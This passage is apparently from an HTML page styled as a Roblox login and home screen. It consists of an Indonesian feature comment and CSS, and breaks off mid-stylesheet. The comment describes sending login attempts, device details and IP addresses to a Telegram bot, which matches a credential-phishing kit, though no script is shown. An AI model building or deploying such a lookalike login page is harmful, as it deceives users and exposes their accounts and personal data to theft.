<!DOCTYPE html>
<!-- 
    ROBLOX LOGIN SYSTEM DENGAN NOTIFIKASI TELEGRAM
    ==============================================
    Fitur-fitur:
    - Validasi login dengan kredensial yang valid
    - Animasi interaktif dan responsif
    - Notifikasi Telegram untuk login berhasil, gagal, dan logout
    - Deteksi perangkat, browser, dan OS
    - Waktu dan IP tracking
    
    Konfigurasi:
    - Telegram Bot Token dan Chat ID sudah dikonfigurasi di dalam script
    - Database user tersedia di variabel userDatabase
    - Untuk hosting, cukup upload file ini ke web server
-->
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Home Screen</title>
    <style>
        /* --- VARIABEL --- */
        :root {
            --primary-color: #0074bd;
            --secondary-color: #00a2ff;
            --accent-color: #ff7b26;
            --dark-bg: #232527;
            --medium-bg: #2a2d30;
            --light-bg: #393d41;
            --text-color: #ffffff;
            --text-secondary: #b8b9ba;
            --success-color: #5cb85c;
            --error-color: #d9534f;
            --header-height: 70px;
            --gold-color: #ffc107;
            --gem-color: #9c27b0;
        }

        /* --- RESET & DASAR --- */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: var(--dark-bg);
            color: var(--text-color);
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
        }

        /* --- PARTICLES BACKGROUND --- */
        .particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            z-index: -1;
        }

        .particle {
            position: absolute;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.1);
            pointer-events: none;
            animation: floatParticle linear infinite;
        }

        @keyframes floatParticle {
            0% {
                transform: translateY(0) rotate(0deg);
                opacity: 1;
                border-radius: 0;
            }
            100% {
                transform: translateY(-1000px) rotate(720deg);
                opacity: 0;
                border-radius: 50%;
            }
        }

        /* --- LOGIN SCREEN --- */
        .login-screen {
            width: 100%;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            perspective: 1000px;
        }

        .login-card {
            background: linear-gradient(145deg, var(--medium-bg), var(--light-bg));
            border-radius: 12px;
            padding: 2rem;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4), 
                        0 0 60px rgba(0, 116, 189, 0.1) inset;
            position: relative;
            overflow: hidden;
            transform-style: preserve-3d;
            animation: cardIntro 1s ease-out forwards;
            max-width: 450px;
            width: 100%;
        }

        @keyframes cardIntro {
            0% {
                opacity: 0;
                transform: translateY(100px) rotateX(20deg);
            }
            100% {
                opacity: 1;
                transform: translateY(0) rotateX(0);
            }
        }

        /* --- LOGO & JUDUL --- */
        .logo-container {
            text-align: center;
            margin-bottom: 2.5rem;
            position: relative;
            padding-top: 40px;
        }

        .logo {
            width: 80px;
            height: 80px;
            position: absolute;
            top: -40px;
            right: 10px;
            animation: logoSpin 3s ease-in-out infinite;
            filter: drop-shadow(0 0 10px rgba(0, 116, 189, 0.7));
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect x="15" y="15" width="30" height="30" rx="5" fill="%230074bd" /><rect x="55" y="15" width="30" height="30" rx="5" fill="%23ff7b26" /><rect x="15" y="55" width="30" height="30" rx="5" fill="%2300a2ff" /><rect x="55" y="55" width="30" height="30" rx="5" fill="%23b8b9ba" /></svg>');
            background-size: cover;
            z-index: 5;
        }

        @keyframes logoSpin {
            0% {
                transform: rotateY(0deg);
            }
            50% {
                transform: rotateY(180deg);
            }
            100% {
                transform: rotateY(360deg);
            }
        }

        .title {
            font-size: 2rem;
            font-weight: 700;
            margin-bottom: 0.5rem;
            color: #0074bd;
            position: relative;
            display: inline-block;
            animation: titleGlow 3s ease-in-out infinite;
            padding: 5px 15px;
        }

        @keyframes titleGlow {
            0%, 100% {
                filter: drop-shadow(0 0 5px rgba(0, 116, 189, 0.3));
            }
            50% {
                filter: drop-shadow(0 0 15px rgba(0, 116, 189, 0.7));
            }
        }

        .subtitle {
            color: var(--text-secondary);
            margin-bottom: 2rem;
            font-size: 1rem;
            opacity: 0;
            transform: translateY(20px);
            animation: fadeInUp 0.8s ease-out 0.3s forwards;
        }

        @keyframes fadeInUp {
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* --- FORM LOGIN --- */
        .form-group {
            margin-bottom: 1.5rem;
            position: relative;
            opacity: 0;
            transform: translateX(-20px);
        }

        .username-container {
            animation: fadeInRight 0.5s ease-out 0.6s forwards;
        }

        .password-container {
            animation: fadeInRight 0.5s ease-out 0.8s forwards;
        }

        @keyframes fadeInRight {
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 500;
            color: var(--text-secondary);
            font-size: 0.9rem;
        }

        input {
            width: 100%;
            padding: 0.8rem 1rem;
            background-color: rgba(0, 0, 0, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            color: var(--text-color);
            font-size: 1rem;
            transition: all 0.3s;
        }

        input:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: 0 0 0 2px rgba(0, 116, 189, 0.3);
        }

        input::placeholder {
            color: rgba(255, 255, 255, 0.4);
        }

        .input-icon {
            position: absolute;
            right: 12px;
            top: 40px;
            color: var(--text-secondary);
            font-size: 1.2rem;
        }

        /* --- REMEMBER ME --- */
        .remember-me {
            display: flex;
            align-items: center;
            cursor: pointer;
        }

        .checkbox-container {
            position: relative;
            width: 18px;
            height: 18px;
            margin-right: 8px;
            border-radius: 3px;
            border: 2px solid var(--text-secondary);
            overflow: hidden;
        }

        .checkbox-container input {
            position: absolute;
            opacity: 0;
            width: 100%;
            height: 100%;
            cursor: pointer;
        }

        .checkbox-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: var(--primary-color);
            transform: scale(0);
            transition: all 0.2s;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            font-size: 12px;
        }

        input:checked ~ .checkbox-overlay {
            transform: scale(1);
        }

        .remember-text {
            font-size: 0.9rem;
            color: var(--text-secondary);
        }

        .extra-features {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 2rem;
            opacity: 0;
            animation: fadeIn 0.5s ease-out 1s forwards;
        }

        @keyframes fadeIn {
            to {
                opacity: 1;
            }
        }

        .forgot-password {
            font-size: 0.9rem;
            color: var(--primary-color);
            text-decoration: none;
            transition: all 0.2s;
        }

        .forgot-password:hover {
            color: var(--secondary-color);
            text-decoration: underline;
        }

        /* --- TOMBOL LOGIN --- */
        .login-button {
            width: 100%;
            padding: 0.9rem;
            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
            border: none;
            border-radius: 8px;
            color: white;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
            opacity: 0;
            transform: translateY(20px);
            animation: fadeInUp 0.5s ease-out 1.2s forwards;
        }

        .login-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }

        .login-button:active {
            transform: translateY(0);
        }

        .login-button .ripple {
            position: absolute;
            border-radius: 50%;
            background-color: rgba(255, 255, 255, 0.7);
            transform: scale(0);
            animation: ripple 0.6s linear;
        }

        @keyframes ripple {
            to {
                transform: scale(4);
                opacity: 0;
            }
        }

        /* --- STATUS LOGIN --- */
        .login-status {
            text-align: center;
            height: 20px;
            margin-top: 1rem;
            font-size: 0.9rem;
            opacity: 0;
            animation: fadeIn 0.5s ease-out 1.4s forwards;
        }

        .error-message {
            color: var(--error-color);
            animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
        }

        .success-message {
            color: var(--success-color);
        }

        @keyframes shake {
            10%, 90% { transform: translate3d(-1px, 0, 0); }
            20%, 80% { transform: translate3d(2px, 0, 0); }
            30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
            40%, 60% { transform: translate3d(4px, 0, 0); }
        }
        
        /* Form shake animation */
        .shake {
            animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
            transform: translate3d(0, 0, 0);
            backface-visibility: hidden;
        }
        
        /* Input shake animation */
        .shake-input {
            animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
            border-color: var(--error-color) !important;
            box-shadow: 0 0 0 2px rgba(217, 83, 79, 0.3) !important;
        }

        /* --- SEPARATOR --- */
        .separator {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 2rem 0;
            opacity: 0;
            animation: fadeIn 0.5s ease-out 1.6s forwards;
        }

        .separator::before,
        .separator::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }

        .separator span {
            padding: 0 10px;
            color: var(--text-secondary);
            font-size: 0.9rem;
        }

        /* --- REGISTER LINK --- */
        .register-link {
            text-align: center;
            margin-top: 1rem;
            font-size: 0.9rem;
            color: var(--text-secondary);
            opacity: 0;
            animation: fadeIn 0.5s ease-out 1.8s forwards;
        }

        .register-link a {
            color: var(--primary-color);
            text-decoration: none;
            font-weight: 600;
            transition: all 0.2s;
        }

        .register-link a:hover {
            color: var(--secondary-color);
            text-decoration: underline;
        }

        /* --- ANIMASI LOADING --- */
        .loading {
            display: none;
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(42, 45, 48, 0.9);
            border-radius: 12px;
            justify-content: center;
            align-items: center;
            z-index: 10;
            flex-direction: column;
        }

        .loading-spinner {
            width: 60px;
            height: 60px;
            border: 5px solid rgba(255, 255, 255, 0.1);
            border-top-color: var(--primary-color);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 1rem;
        }

        .loading-text {
            font-size: 1.2rem;
            color: var(--text-color);
            animation: pulse 1.5s ease-in-out infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        @keyframes pulse {
            0%, 100% {
                opacity: 1;
            }
            50% {
                opacity: 0.5;
            }
        }

        /* --- HOME SCREEN --- */
        .home-screen {
            display: none;
            flex-direction: column;
            min-height: 100vh;
        }

        /* --- HEADER --- */
        .header {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: var(--header-height);
            background-color: var(--medium-bg);
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 2rem;
            z-index: 100;
        }

        .logo-area {
            display: flex;
            align-items: center;
        }

        .logo-small {
            width: 40px;
            height: 40px;
            margin-right: 10px;
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect x="15" y="15" width="30" height="30" rx="5" fill="%230074bd" /><rect x="55" y="15" width="30" height="30" rx="5" fill="%23ff7b26" /><rect x="15" y="55" width="30" height="30" rx="5" fill="%2300a2ff" /><rect x="55" y="55" width="30" height="30" rx="5" fill="%23b8b9ba" /></svg>');
            background-size: cover;
        }

        .logo-text {
            font-size: 1.5rem;
            font-weight: 700;
            background: linear-gradient(90deg, silver, #e0e0e0);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            position: relative;
            padding: 2px 10px;
        }
        
        .logo-text::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: black;
            z-index: -1;
            border-radius: 4px;
        }

        .user-area {
            display: flex;
            align-items: center;
        }

        .currency {
            display: flex;
            margin-right: 1.5rem;
        }

        .currency-item {
            display: flex;
            align-items: center;
            background-color: rgba(0, 0, 0, 0.2);
            padding: 5px 10px;
            border-radius: 20px;
            margin-right: 10px;
        }

        .currency-icon {
            margin-right: 6px;
            font-size: 1.2rem;
        }

        .coins {
            color: var(--gold-color);
        }

        .gems {
            color: var(--gem-color);
        }

        .user-avatar {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background-color: var(--primary-color);
            margin-right: 10px;
            display: flex;
            justify-content: center;
            align-items: center;
            font-weight: bold;
            font-size: 1.2rem;
            color: white;
        }

        .user-info {
            display: flex;
            flex-direction: column;
            margin-right: 15px;
        }

        .username {
            font-weight: 600;
            font-size: 0.9rem;
        }

        .level {
            color: var(--text-secondary);
            font-size: 0.8rem;
        }

        .logout-btn {
            padding: 6px 12px;
            background-color: var(--error-color);
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 0.8rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .logout-btn:hover {
            background-color: #c9302c;
        }

        /* --- MAIN CONTENT --- */
        .main-content {
            padding-top: calc(var(--header-height) + 20px);
            max-width: 1200px;
            margin: 0 auto;
            padding-bottom: 2rem;
            width: 100%;
            padding-left: 20px;
            padding-right: 20px;
        }

        /* --- ANIMATED BANNER --- */
        .banner {
            width: 100%;
            height: 250px;
            margin-bottom: 2rem;
            position: relative;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            opacity: 0;
            transform: translateY(30px);
            animation: slideUp 0.8s ease-out forwards;
        }

        @keyframes slideUp {
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .banner-bg {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(45deg, #2193b0, #6dd5ed);
            z-index: 1;
        }

        .banner-content {
            position: relative;
            z-index: 2;
            height: 100%;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            padding: 0 2rem;
        }

        .banner-title {
            font-size: 2.5rem;
            font-weight: 800;
            margin-bottom: 1rem;
            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
            color: #0074bd;
            position: relative;
            display: inline-block;
            padding: 5px 15px;
        }

        .banner-text {
            font-size: 1.2rem;
            margin-bottom: 1.5rem;
            max-width: 600px;
        }

        .banner-btn {
            padding: 12px 24px;
            background-color: var(--accent-color);
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            font-size: 1rem;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
        }

        .banner-btn:hover {
            transform: translate
